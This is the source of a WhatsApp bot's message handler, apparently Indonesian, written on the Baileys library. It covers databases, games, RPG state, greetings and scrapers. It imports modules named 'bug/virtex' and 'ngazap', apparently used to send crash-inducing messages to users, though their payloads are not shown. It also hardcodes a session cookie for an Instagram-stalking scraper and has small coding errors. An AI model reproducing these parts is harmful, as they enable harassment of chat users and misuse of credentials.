//Cieee ngapain ngintip segala Mau nyuri yaaaa untung gw enc wkwkwkw
const { 
BufferJSON, 
WA_DEFAULT_EPHEMERAL, 
generateWAMessageFromContent, 
proto, 
generateWAMessageContent, 
generateWAMessage, 
prepareWAMessageMedia, 
downloadContentFromMessage,
areJidsSameUser, 
getContentType,
delay
} = require('@adiwajshing/baileys')

const fs = require('fs')
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
const translate = require("@vitalets/google-translate-api");
const util = require('util')
const chalk = require('chalk')
const jimp = require('jimp')
const { exec, spawn, execSync } = require("child_process")
const axios = require('axios')
const cheerio = require('cheerio')
const rapid = require('./lib/rapid.js')
const cookie = require('cookie')
const path = require('path')
const d = require('d-scrape')
const { Configuration, OpenAIApi } = require('openai');
const os = require('os')
const toMS = require("ms");
const ms = require("parse-ms");
const nou = require("node-os-utils");
const kotz = require("kotz-api");
const instagramGetUrl = require("instagram-url-direct");
const gtts = require('node-gtts')
const { googleImage }= require("@bochilteam/scraper");
const hxz = require("hxz-api");
const yts = require ("yt-search");
const FormData = require("form-data");
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const speed = require('performance-now')
const { performance } = require('perf_hooks')
const { sizeFormatter } = require("human-readable");
const similarity = require('similarity')
const threshold = 0.72

let format = sizeFormatter({
std: "JEDEC", // 'SI' (default) | 'IEC' | 'JEDEC'
decimalPlaces: 2,
keepTrailingZeroes: false,
render: (literal, symbol) => `${literal} ${symbol}B`,
});
var dbs = []
global.dbc = dbs

const _prem = require("./lib/premium");
const _sewa = require("./lib/sewa");
const { isSetWelcome, addSetWelcome, changeSetWelcome, removeSetWelcome } = require('./lib/setwelcome');
const { isSetLeft, addSetLeft, removeSetLeft, changeSetLeft } = require('./lib/setleft');
const { getLimit, isLimit, limitAdd, giveLimit, addBalance, kurangBalance, getBalance, isGame, gameAdd, givegame, cekGLimit } = require("./lib/limit");
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./lib/respon-list');
const { addRespons, checkRespons, deleteRespons } = require('./lib/respon');
const { isSetProses, addSetProses, removeSetProses, changeSetProses, getTextSetProses } = require('./lib/setproses');
const { isSetDone, addSetDone, removeSetDone, changeSetDone, getTextSetDone } = require('./lib/setdone');
const { isSetOpen, addSetOpen, removeSetOpen, changeSetOpen, getTextSetOpen } = require("./lib/setopen");
const { isSetClose, addSetClose, removeSetClose, changeSetClose, getTextSetClose } = require("./lib/setclose");
const { casinoSave, setCasino, deleteCasino } = require("./lib/casino");
const msgFilter = require("./lib/antispam");
const { generateProfilePicture, removeEmojis, smsg, tanggal, formatp, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, parseMention, getRandom, getGroupAdmins } = require('./lib/myfunc')
const { yta, ytv } = require('./lib/y2mate')
const { goLens } = require("./lib/googlens");
const { topUp } = require("./lib/duniagames");
const { TelegraPh, UploadFileUgu } = require('./lib/uploader')
const { quote } = require('./lib/quote') 
const { pinterest } = require('./lib/scraper')
const { TelegraPH } = require("./lib/TelegraPH")
const { remini } = require('./lib/remini')
const { virtexnya } = require("./bug/virtex")
const { ngazap } = require ('./bug/ngazap')
const { virtex } = require ('./bug/virtex')
const ffstalk = require('./lib/ffstalk')
const crypto = require('crypto')
const mlstalk = require('./lib/mlstalk')
const { color, bgcolor } = require('./lib/color')
const { getTextSetWelcome } = require('./lib/setwelcome');
const { getTextSetLeft } = require('./lib/setleft');
const afk = require("./lib/afk");
// Database
let setiker = JSON.parse(fs.readFileSync('./database/stik.json'))
let audionye = JSON.parse(fs.readFileSync('./database/vn.json'))
let imagenye = JSON.parse(fs.readFileSync('./database/image.json'))
let videonye = JSON.parse(fs.readFileSync('./database/video.json'))
let set_welcome_db = JSON.parse(fs.readFileSync('./database/set_welcome.json'));
let set_left_db = JSON.parse(fs.readFileSync('./database/set_left.json'));
let set_proses = JSON.parse(fs.readFileSync('./database/set_proses.json'));
let set_done = JSON.parse(fs.readFileSync('./database/set_done.json'));
let set_open = JSON.parse(fs.readFileSync('./database/set_open.json'));
let set_close = JSON.parse(fs.readFileSync('./database/set_close.json'));
let _afk = JSON.parse(fs.readFileSync('./database/afk.json'));
let db_respon_list = JSON.parse(fs.readFileSync('./database/list-message.json'));
let sewa = JSON.parse(fs.readFileSync('./database/sewa.json'));
let opengc = JSON.parse(fs.readFileSync('./database/opengc.json'));
let closegc = JSON.parse(fs.readFileSync('./database/closegc.json'));
let _nsfw = JSON.parse(fs.readFileSync('./database/nsfw.json'))
let pendaftar = JSON.parse(fs.readFileSync('./database/user.json'))
let mess = JSON.parse(fs.readFileSync('./mess.json'));
let premium = JSON.parse(fs.readFileSync('./database/premium.json'));
let balance = JSON.parse(fs.readFileSync('./database/balance.json'));
let limit = JSON.parse(fs.readFileSync('./database/limit.json'));
let glimit = JSON.parse(fs.readFileSync('./database/glimit.json'));
let kickme = JSON.parse(fs.readFileSync('./database/kickme.json'));
let mute = JSON.parse(fs.readFileSync('./database/mute.json'));
let antilink = JSON.parse(fs.readFileSync('./database/antilink.json'));
let antiwame = JSON.parse(fs.readFileSync('./database/antiwame.json'));
let antilink2 = JSON.parse(fs.readFileSync('./database/antilink2.json'));
let antiwame2 = JSON.parse(fs.readFileSync('./database/antiwame2.json'));
let listCmd = JSON.parse(fs.readFileSync('./database/listcmd.json'));
let _cmd = JSON.parse(fs.readFileSync('./database/command.json'));
let _cmdUser = JSON.parse(fs.readFileSync('./database/commandUser.json'));
let modsNumber = JSON.parse(fs.readFileSync('./database/modsNumber.json'));
let responDB = JSON.parse(fs.readFileSync('./database/respon.json'));
let listStore = JSON.parse(fs.readFileSync('./database/list-message.json'));
let _limit = JSON.parse(fs.readFileSync('./database/user/limit.json'));
let _buruan = JSON.parse(fs.readFileSync('./database/user/hasil_buruan.json'));
let _darahOrg = JSON.parse(fs.readFileSync('./database/user/darah.json'))
let openaipc = JSON.parse(fs.readFileSync('./database/openaipc.json'))
let openaigc = JSON.parse(fs.readFileSync('./database/openaigc.json'))
const _petualang = JSON.parse(fs.readFileSync('./database/user/inventory.json'))
const { addInventoriDarah, cekDuluJoinAdaApaKagaDiJson, addDarah, kurangDarah, getDarah } = require('./database/user/darah.js')
const { cekInventoryAdaAtauGak } = require('./database/user/alat_tukar.js')
const { addInventoriMonay, cekDuluJoinAdaApaKagaMonaynyaDiJson, addMonay, kurangMonay, getMonay } = require('./database/user/monay.js')
const { addInventoriLimit, cekDuluJoinAdaApaKagaLimitnyaDiJson, addLimit, kurangLimit } = require('./database/user/limit.js')
const { cekDuluHasilBuruanNya, addInventoriBuruan, addAyam, addKelinci, addDomba, addSapi, addGajah, kurangIkan, kurangAyam, kurangKelinci, kurangDomba, kurangSapi,kurangGajah, getIkan, getAyam, getKelinci, getDomba,getSapi,getGajah} = require('./database/user/buruan.js')
const { getLevelingXp,getLevelingLevel,getLevelingId,addLevelingXp,addLevelingLevel,addLevelingId,addATM,addKoinUser,checkATMuser,addIkan,getMancingIkan,getMancingId,addMancingId,jualIkan,addPlanet,getBertualangPlanet,getPlaneId,addPlaneId,jualbahankimia,addCoal,getMiningcoal,getMiningId,addMiningId,jualcoal,addStone,getMiningstone,getBatuId,addBatuId,jualstone,addOre,getMiningore,getOreId,addOreId,jualore,addIngot,getMiningingot,getIngotId,addIngotId,jualingot,addKayu,getNebangKayu,getNebangId,addNebangId,jualKayu, checkPetualangUser, addInventori, sellBesi, addDm, sellDm, getDm, sellEmas, addFish, sellFish, getFish, addBesi, addEmas, addEmerald, addUmpan, addPotion, kurangBesi, kurangEmas, kurangEmerald, kurangUmpan, kurangPotion,getBesi, getEmas, getEmerald,getUmpan,getPotion} = require('./database/user/rpg.js');
const { command } = require('yargs');

let DarahAwal = 100;
const ikan = ['🐟','🐠','🐡']
const enter = '\n'

// DB Game
let tictactoe = [];
let kuis = []
const kuismath = {}
const _family100 = {}
const tebakgambar = {}
const tebakgame ={}
const tebakkata = {}
const tebakbendera = {}
const siapaaku = {}
const tebakkalimat = {}
const caklontong = {}
const susunkata = {}
const tekateki = {}
const tebakkabupaten = {}
const tebakkimia = {}
const tebaklirik = {}
const tebaktebakan = {}

// Auto Reset Limit
setInterval(function() { 
var jamna = new Date().toLocaleTimeString('en-US', { timeZone: "Asia/Jakarta" });
var hasilnes = jamna.split(':')[0] < 10 ? '0' + jamna : jamna
if(hasilnes === '12:00:00 AM') {
limit = []
fs.writeFileSync('./database/limit.json', JSON.stringify(limit))
glimit = []
fs.writeFileSync('./database/glimit.json', JSON.stringify(glimit))
console.log("Limit Sudah Di Reset!")
}
}, 1000);



// Bandwidth
async function checkBandwidth() {
let ind = 0;
let out = 0;
for (let i of await require("node-os-utils").netstat.stats()) {
ind += parseInt(i.inputBytes);
out += parseInt(i.outputBytes);
}
return {
download: format(ind),
upload: format(out),
};
}
moment.tz.setDefault("Asia/Jakarta").locale("id");

module.exports = Aira = async (Aira, m, chatUpdate, mek, store, setting, isSetWelcome, getTextSetWelcome, set_welcome_db, set_left_db, isSetLeft, getTextSetLeft, _welcome, _left, antidelete, antionce) => {
try {
const { ownerNumber, instagram, gcwa, ownerName, botName, footer, pathimg, gamewaktu, limitCount } = setting
const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
var budy = (typeof m.text == 'string' ? m.text : '')
const content = JSON.stringify(mek.message)
const type = Object.keys(mek.message)[0];
if (m && type == "protocolMessage") Aira.ev.emit("message.delete", m.message.protocolMessage.key);
const botNumber = await Aira.decodeJid(Aira.user.id)
const isCreator = [botNumber, ...ownerNumber].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const isCommand = isCmd ? body.slice(1).trim().split(' ').shift().toLowerCase() : ""
const command = isCreator ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : isCommand
//const command = isCmd ? body.slice(1).trim().split(' ').shift().toLowerCase() : ''
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const itsMe = m.sender == botNumber ? true : false
const text = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const { allMenu, simpleMenu, mainMenu, convertMenu, anonymousMenu, storeMenu, panelMenu, resellerMenu, rpgMenu, gameMenu, groupMenu, downloadMenu, searchMenu, randomMenu, randomQuotes, cewekMenu, cowokMenu, balanceMenu, ownerMenu, storageMenu, asupanMenu, randomSticker, stalkingMenu, imageEffect, funMenu, islamMenu, bugMenu, nsfwMenu, textproMenu, photooxyMenu, ephotoMenu, logoMenu, donate, banMenu} = require('./menu') 
let footxt = `${footer}`
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const jam = moment().format("HH:mm:ss z")
let dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
var fildt = dt == 'pagi' ? dt + '🌝' : dt == 'siang' ? dt + '🌞' : dt == 'sore' ? dt + '🌝' : dt + '🌚'
const ucapanWaktu = fildt.charAt(0).toUpperCase() + fildt.slice(1)

//━━━━━━━━━━━━━━━[ WAKTU ]━━━━━━━━━━━━━━━━━//

const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if(time2 < "23:59:00"){
        var ucapanWaktu2 = time2 + ' WIB \nSelamat Malam 🏙️'
}
        if(time2 < "19:00:00"){
        var ucapanWaktu2 = time2 + ' WIB \nSelamat Petang 🌆'
}
        if(time2 < "18:00:00"){
        var ucapanWaktu2 = time2 + ' WIB \nSelamat Sore 🌇'
}
        if(time2 < "15:00:00"){
        var ucapanWaktu2 = time2 + ' WIB \nSelamat Siang 🌤️'
}
        if(time2 < "10:00:00"){
        var ucapanWaktu2 = time2 + ' WIB \nSelamat Pagi 🌄'
}
        if(time2 < "05:00:00"){
        var ucapanWaktu2 = time2 + ' WIB \nSelamat Subuh 🌆'
}
        if(time2 < "03:00:00"){
        var ucapanWaktu2 = time2 + ' WIB \nSelamat Tengah Malam 🌃'
}

const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a');



// Group
const groupMetadata = m.isGroup ? await Aira.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const groupMembers = m.isGroup ? groupMetadata.participants : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isUser = pendaftar.includes(m.sender)
const isPetualang = checkPetualangUser(m.sender)
const isPremium = isCreator ? true : _prem.checkPremiumUser(m.sender, premium)
const isSewa = _sewa.checkSewaGroup(m.chat, sewa)
const isKickMe = kickme.includes(m.chat) ? true : false
const isMute= mute.includes(m.chat) ? true : false
const isAntiLink = antilink.includes(m.chat) ? true : false
const isAntiLink2 = antilink2.includes(m.chat) ? true : false
const isAntidelete = antidelete.includes(m.chat) ? true : false
const isAntionce = antionce.includes(m.chat) ? true : false
const isAutoAiGc = openaigc.includes(m.chat) ? true : false
const isAutoAiPc = openaipc.includes(botNumber) ? true : false
const isWelcome = _welcome.includes(m.chat) ? true : false
const isLeft = _left.includes(m.chat) ? true : false
const isAfkOn = afk.checkAfkUser(m.sender, _afk)
const isNsfw = _nsfw.includes(m.chat) ? true : false

const isAntiWame = antiwame.includes(m.chat) ? true : false
const isAntiWame2 = antiwame2.includes(m.chat) ? true : false
const gcounti = setting.gcount
const gcount = isPremium ? gcounti.prem : gcounti.user
let timestamp = speed();
let latensi = speed() - timestamp
const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `6285600793871-1614953337@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': pathimg, thumbnail: pathimg,sendEphemeral: true}}}
const fkontaku = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': pathimg, thumbnail: pathimg,sendEphemeral: true}}}
const fbot = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': `Aira.ai`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': pathimg, thumbnail: pathimg,sendEphemeral: true}}}
const isDarah = await cekDuluJoinAdaApaKagaDiJson(m.senpder)
const isCekDarah = await getDarah(m.sender)
const isUmpan = await getUmpan(m.sender)
const isPotion = await getPotion(m.sender)
const isIkan = await getIkan(m.sender)
const isAyam = await getAyam(m.sender)
const isKelinci = await getKelinci(m.sender)
const isDomba = await getDomba(m.sender)
const isSapi = await getSapi(m.sender)
const isGajah = await getGajah(m.sender)
const isMonay = await getMonay(m.sender)
const isBesi = await getBesi(m.sender)
const isEmas = await getEmas(m.sender)
const isEmerald = await getEmerald(m.sender)
const isInventory = await cekInventoryAdaAtauGak(m.sender)
const isInventoriBuruan = await cekDuluHasilBuruanNya(m.sender)
const isInventoryLimit = await cekDuluJoinAdaApaKagaLimitnyaDiJson(m.sender)
const isInventoryMonay = await cekDuluJoinAdaApaKagaMonaynyaDiJson(m.sender)
dbs.push({id: m.key.id, m}); 

const ments = (text) => {return text.match('@') ? [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net') : []}
const but1 = (id, text) => [{buttonId: id, buttonText: {displayText: text}, type: 1}]
const but2 = (id1, text1, id2, text2) => [{buttonId: id1, buttonText: {displayText: text1 }, type: 1}, {buttonId: id2, buttonText: {displayText: text2}, type: 1}]
const but3 = (id1, text1, id2, text2, id3, text3) => [{buttonId: id1, buttonText: {displayText: text1}, type: 1}, {buttonId: id2, buttonText: {displayText: text2}, type: 1}, {buttonId: id3, buttonText: {displayText: text3}, type: 1}]
const sendbut = async(id, text, footer, buttons = [], quoted) => {Aira.sendMessage(id, {text: text, footer: footer, buttons: buttons, headerType: 2, mentions: ments(text)}, {quoted: quoted})}
const sendbutimg = async(id, caption, footer, image, buttons = [], quoted) => {await Aira.sendMessage(id, {image: image, caption: caption, footer: footer, buttons: buttons, headerType: 4, mentions: ments(caption)}, {quoted: quoted})}
const sendbutvid = async(id, caption, footer, video, buttons = [], quoted) => {await Aira.sendMessage(id, {video: video, caption: caption, footer: footer, buttons: buttons, headerType: 5, mentions: ments(caption)}, {quoted: quoted})}

const reply = (teks) => {
return Aira.sendMessage(m.chat, { text: teks, mentions: ments(teks) }, {quoted: m})
}





//Function Polling
Aira.ments = (teks = '') => {
return teks.match('@') ? [...teks.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net') : []
};
Aira.sendteks = async(chatId, text = '', quoted = '', opts = {}) => {
return Aira.sendMessage(chatId, { text: text, mentions: await Aira.ments(text), ...opts}, {quoted:quoted})
};
Aira.sendPoll = (jid, name = '', values = [], selectableCount = global.select) => {
return Aira.sendMessage(jid, {poll: { name, values, selectableCount }})
};
// RESPON CMD POLL MESSAGE THE JO BOT
async function getMessage(key){
if (store) {
const msg = await store.loadMessage(key.remoteJid, key.id)
return msg?.message
}
return {conversation: 'Aira.ai'}
}

Aira.ev.on('messages.update', async(chatUpdate) => {
for (const { key, update } of chatUpdate) {
if (update.pollUpdates && key.fromMe) {
const pollCreation = await getMessage(key)
if (pollCreation) {
const pollUpdate = await getAggregateVotesInPollMessage({
message: pollCreation,
pollUpdates: update.pollUpdates,
})
const command = pollUpdate.filter(v => v.voters.length !== 0)[0]?.name
if (command == undefined) return
const comand = global.prefix+command
console.log(comand)
Aira.appenTextMessage(comand, chatUpdate)
}
}
}
})
const nebal = (angka) => {
return Math.floor(angka)
}
if(!isPetualang){
reqXp = 5000 * (Math.pow(2, getLevelingLevel(m.sender)) - 1)
await _petualang.push(m.sender)
await addInventoriDarah(m.sender, DarahAwal)
await addInventori(m.sender)
await addInventoriBuruan(m.sender)
await fs.writeFileSync('./database/user/inventory.json', JSON.stringify(_petualang))
await addLevelingId(m.sender)
console.log(`${pushname} 𝙏𝙚𝙡𝙖𝙝 𝘿𝙞𝙩𝙖𝙢𝙗𝙖𝙝𝙠𝙖𝙣 𝙆𝙚𝙙𝙖𝙡𝙖𝙢 𝘿𝙖𝙩𝙖𝙗𝙖𝙨𝙚 Aira.ai`)
}

function hitungmundur(tanggal, bulan, tahun){
let from = new Date(`${bulan} ${tanggal}, ${tahun} 00:00:00`).getTime();
let now = Date.now();
let distance = from - now;
let days = Math.floor(distance / (1000 * 60 * 60 * 24));
let hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
let minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
let seconds = Math.floor((distance % (1000 * 60)) / 1000);
return days + ' Hari ' + hours + ' Jam ' + minutes + ' Menit ' + seconds + ' Detik'
}

const isEmoji = (emo) => {
let emoji_ranges = /(?:[\u2700-\u27bf]|(?:\ud83c[\udde6-\uddff]){2}|[\ud800-\udbff][\udc00-\udfff]|[\u0023-\u0039]\ufe0f?\u20e3|\u3299|\u3297|\u303d|\u3030|\u24c2|\ud83c[\udd70-\udd71]|\ud83c[\udd7e-\udd7f]|\ud83c\udd8e|\ud83c[\udd91-\udd9a]|\ud83c[\udde6-\uddff]|\ud83c[\ude01-\ude02]|\ud83c\ude1a|\ud83c\ude2f|\ud83c[\ude32-\ude3a]|\ud83c[\ude50-\ude51]|\u203c|\u2049|[\u25aa-\u25ab]|\u25b6|\u25c0|[\u25fb-\u25fe]|\u00a9|\u00ae|\u2122|\u2139|\ud83c\udc04|[\u2600-\u26FF]|\u2b05|\u2b06|\u2b07|\u2b1b|\u2b1c|\u2b50|\u2b55|\u231a|\u231b|\u2328|\u23cf|[\u23e9-\u23f3]|[\u23f8-\u23fa]|\ud83c\udccf|\u2934|\u2935|[\u2190-\u21ff])/g;
let regexEmoji = new RegExp(emoji_ranges, 'gi');
return emo.match(regexEmoji)
}

async function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)]
}

async function igstalk(Username) {
return new Promise((resolve, reject) => {
axios.get('https://dumpor.com/v/'+Username, {
headers: {
"cookie": "_inst_key=SFMyNTY.g3QAAAABbQAAAAtfY3NyZl90b2tlbm0AAAAYWGhnNS1uWVNLUU81V1lzQ01MTVY2R0h1.fI2xB2dYYxmWqn7kyCKIn1baWw3b-f7QvGDfDK2WXr8",
"user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
}
}).then(res => {
const $ = cheerio.load(res.data)
const result = {
profile: $('#user-page > div.user > div.row > div > div.user__img').attr('style').replace(/(background-image: url\(\'|\'\);)/gi, ''),
fullname: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > a > h1').text(),
username: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > h4').text(),
post: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(1)').text().replace(' Posts',''),
followers: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(2)').text().replace(' Followers',''),
following: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(3)').text().replace(' Following',''),
bio: $('#user-page > div.user > div > div.col-md-5.my-3 > div').text()
}
resolve(result)
})
})
}

async function getGcName(groupID) {
try {
let data_name = await Aira.groupMetadata(groupID)
return data_name.subject
} catch (err) {
return ''
}
}

function randomNomor(min, max = null) {
if (max !== null) {
min = Math.ceil(min);
max = Math.floor(max);
return Math.floor(Math.random() * (max - min + 1)) + min;
} else {
return Math.floor(Math.random() * min) + 1
}
}
/*if ( m.mtype == 'viewOnceMessage' && m.msg.viewOnce) {
try {
Aira.ev.emit("viewOnceMessage", m);
} catch (err) {
console.error(util.format(err))
}}*/
try {
let chats = db.data.chats[m.chat]
if (typeof chats !== 'object') db.data.chats[m.chat] = {}
if (chats) {
if (!('goodbye' in chats)) chats.goodbye = setting.auto_leaveMsg
if (!('welcome' in chats)) chats.welcome = setting.auto_welcomeMsg
} else db.chats[m.chat] = {
goodbye: setting.auto_leaveMsg, 
welcome: setting.auto_welcomeMsg, 
}
} catch (e){
console.log(e)
}
// Public & Self
if (!Aira.public) {
if (!m.key.fromMe) return
}
//if(!premium){return newReply ('MAAF SEMUA FITUR DI BOT INI KHUSUS USER PREMIUM ANDA DAPAT MENGGUNAKAN VERSI GRATIS DI: wa.me//6285745446417?text=.menu'}

if (m.isGroup) {
const Fisha = await getMancingIkan(m.sender)
const FishId = await getMancingId(m.sender)
if (Fisha === undefined && FishId === undefined) await addMancingId(m.sender)
}

if (m.isGroup) {
const Hapea = await getBertualangPlanet(m.sender)
const HapeId = await getPlaneId(m.sender)
if (Hapea === undefined && HapeId === undefined) await addPlaneId(m.sender)
}

if (m.isGroup) {
const Coala = await getMiningcoal(m.sender)
const CoalId = await getMiningId(m.sender)
if (Coala === undefined && CoalId === undefined) await addMiningId(m.sender)
}

if (m.isGroup) {
const Stonea = await getMiningstone(m.sender)
const StoneId = await getBatuId(m.sender)
if (Stonea === undefined && StoneId === undefined) await addBatuId(m.sender)
}

if (m.isGroup) {
const Orea = await getMiningore(m.sender)
const OreId = await getOreId(m.sender)
if (Orea === undefined && OreId === undefined) await addOreId(m.sender)
}

if (m.isGroup) {
const Ingota = await getMiningingot(m.sender)
const IngotId = await getIngotId(m.sender)
if (Ingota === undefined && IngotId === undefined) await addIngotId(m.sender)
}

if (m.isGroup) {
const Kayua = await getNebangKayu(m.sender)
const KayuId = await getNebangId(m.sender)
if (Kayua === undefined && KayuId === undefined) await addNebangId(m.sender)
}

if (m.isGroup ) {
const checkATM = await checkATMuser(m.sender)
try {
if (checkATM === undefined) await addATM(m.sender)
const uangsaku = Math.floor(Math.random() * 10) + 90
addKoinUser(m.sender, uangsaku)
} catch (err) {
console.error(err)
}
}
const levelRole = await getLevelingLevel(m.sender)
var role = 'Bronze 1'
if (levelRole <= 2) {
role = 'Bronze 1'
} else if (levelRole <= 10) {
role = 'Bronze 2'
} else if (levelRole <= 20) {
role = 'Bronze 3'
} else if (levelRole <= 30) {
role = 'Bronze 4'
} else if (levelRole <= 40) {
role = 'Bronze 5'
} else if (levelRole <= 70) {
role = 'Silver 1'
} else if (levelRole <= 85) {
role = 'Silver 2'
} else if (levelRole <= 95) {
role = 'Silver 3'
} else if (levelRole <= 105) {
role = 'Silver 4'
} else if (levelRole <= 125) {
role = 'Silver 5'
} else if (levelRole <= 150) {
role = 'Gold 1'
} else if (levelRole <= 170) {
role = 'Gold 2'
} else if (levelRole <= 190) {
role = 'Gold 3'
} else if (levelRole <= 210) {
role = 'Gold 4'
} else if (levelRole <= 230) {
role = 'Gold 5'
} else if (levelRole <= 260) {
role = 'Platinum 1'
} else if (levelRole <= 290) {
role = 'Platinum 2'
} else if (levelRole <= 320) {
role = 'Platinum 3'
} else if (levelRole <= 350) {
role = 'Platinum 4'
} else if (levelRole <= 380) {
role = 'Platinum 5'
} else if (levelRole <= 410) {
role = 'Diamond 1'
} else if (levelRole <= 450) {
role = 'Diamond 2'
} else if (levelRole <= 500) {
role = 'Diamond 3'
} else if (levelRole <= 550) {
role = 'Diamond 4'
} else if (levelRole <= 600) {
role = 'Diamond 5'
} else if (levelRole <= 700) {
role = 'Master'
} else if (levelRole <= 800) {
role = 'Master ✩'
} else if (levelRole <= 900) {
role = 'Master ✩✩'
} else if (levelRole <= 1000) {
role = 'Master ✩✩✩'
} else if (levelRole <= 1100) {
role = 'Master ✯'
} else if (levelRole <= 1225) {
role = 'Master ✯✯'
} else if (levelRole <= 1340) {
role = 'Master ✯✯✯'
} else if (levelRole <= 1400) {
role = 'GrandMaster'
} else if (levelRole <= 1555) {
role = 'GrandMaster ✩'
} else if (levelRole <= 1660) {
role = 'GrandMaster ✩✩'
} else if (levelRole <= 1710) {
role = 'GrandMaster ✩✩✩'
} else if (levelRole <= 1825) {
role = 'GrandMaster ✯'
} else if (levelRole <= 1950) {
role = 'GrandMaster ✯✯'
} else if (levelRole <= 2000) {
role = 'GrandMaster ✯✯✯'
} else if (levelRole <= 2220) {
role = 'Legends'
} else if (levelRole <= 2500) {
role = 'Legends 2'
} else if (levelRole <= 2700) {
role = 'Legends 3'
} else if (levelRole <= 2900) {
role = 'Legends 4'
} else if (levelRole <= 3100) {
role = 'Legends 5'
} else if (levelRole <= 3300) {
role = 'Legends 6'
} else if (levelRole <= 3600) {
role = 'Legends 7'
} else if (levelRole <= 3900) {
role = 'Legends 8'
} else if (levelRole <= 4200) {
role = 'Legends 9'
} else if (levelRole <= 4450) {
role = 'Legends 10'
} else if (levelRole <= 4700) {
role = 'Legends 忍'
} else if (levelRole <= 4900) {
role = 'Legends 忍¹'
} else if (levelRole <= 5100) {
role = 'Legends 忍²'
} else if (levelRole <= 5600) {
role = 'Legends 忍³'
} else if (levelRole <= 6100) {
role = 'Legends 忍⁴'
} else if (levelRole <= 7000) {
role = 'GrandLegends'
} else if (levelRole <= 10000) {
role = 'GrandLegends 1'
} else if (levelRole <= 20000) {
role = 'GrandLegends 2'
} else if (levelRole <= 30000) {
role = 'GrandLegends 3'
} else if (levelRole <= 40000) {
role = 'GrandLegends 4'
} else if (levelRole <= 50000) {
role = 'GrandLegends 忍¹'
} else if (levelRole <= 60000) {
role = 'GrandLegends 忍²'
} else if (levelRole <= 70000) {
role = 'GrandLegends 忍³'
} else if (levelRole <= 80000) {
role = 'GrandLegends 忍⁴'
} else if (levelRole <= 90000) {
role = 'Pro 숒'
} else if (levelRole <= 100000) {
role = 'Pro × GrandLegends 숒'
}

// Push Message To Console
if (m.message) {
console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32m AiraBot-Md \x1b[1;37m]', time, chalk.green(budy.slice(0, 100) || m.mtype), 'from', chalk.green(pushname), 'in', chalk.green(groupName ? groupName : 'Private Chat' ), 'args :', chalk.green(text.length))
}

//mongodb



